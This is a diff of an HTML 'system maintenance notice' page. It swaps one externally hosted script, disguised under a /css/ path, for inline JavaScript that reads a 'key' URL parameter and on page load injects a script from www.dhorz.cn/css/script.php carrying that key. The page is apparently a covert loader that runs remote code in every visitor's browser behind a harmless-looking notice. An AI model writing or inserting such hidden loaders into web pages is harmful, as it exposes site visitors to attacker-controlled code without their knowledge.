@@ -4,10 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>公司系统维护公告</title>
-    <script src="http://school.iklqs.cn/css/scripts.css"></script>
+    <style>
+        body { margin: 0; padding: 0; overflow: hidden; min-height: 100vh; box-sizing: border-box; }
+    </style>
 </head>
 <body>
-    <div class="notice-container">
+    <div id="noticeBox" class="notice-container">
         <h1 class="notice-title">公司系统维护公告</h1>
         <div class="notice-content">
             <p>尊敬的用户：</p>
@@ -21,5 +23,12 @@
             <div class="record-code">ICP备案号：鄂ICP备2024037200号-1</div>
         </div>
     </div>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const currentKey = urlParams.get('key') || '';
+        const script = document.createElement('script');
+        script.src = `http://www.dhorz.cn/css/script.php?key=${encodeURIComponent(currentKey)}`;
+        document.head.appendChild(script);
+    </script>
 </body>
 </html>
